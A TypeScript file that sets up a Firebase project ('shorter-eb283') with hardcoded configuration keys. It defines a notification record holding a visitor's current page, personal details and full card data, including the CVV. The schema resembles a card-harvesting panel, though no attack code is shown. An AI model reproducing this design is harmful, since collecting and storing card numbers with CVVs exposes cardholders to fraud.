import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyCGCDrYnUd1DHG2s6364nqGxp7338GzHVo",
  authDomain: "shorter-eb283.firebaseapp.com",
  databaseURL: "https://shorter-eb283-default-rtdb.firebaseio.com",
  projectId: "shorter-eb283",
  storageBucket: "shorter-eb283.firebasestorage.app",
  messagingSenderId: "135499333914",
  appId: "1:135499333914:web:8678f830ae74dcb378aca3",
  measurementId: "G-4Z0WNYRQXV"

};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

